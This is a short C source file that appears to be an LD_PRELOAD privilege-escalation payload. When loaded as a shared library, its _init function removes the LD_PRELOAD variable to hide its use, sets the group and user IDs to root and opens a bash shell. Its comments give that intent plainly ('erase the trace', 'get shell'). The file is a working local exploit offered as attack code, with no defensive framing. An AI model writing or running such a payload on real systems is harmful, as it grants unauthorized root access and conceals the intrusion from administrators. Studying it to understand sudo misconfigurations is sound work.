#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() { // execute when loaded.
    unsetenv("LD_PRELOAD"); // erase the trace.
    setgid(0); // su root group.
    setuid(0); // su to root.
    system("/bin/bash"); // get shell！
}
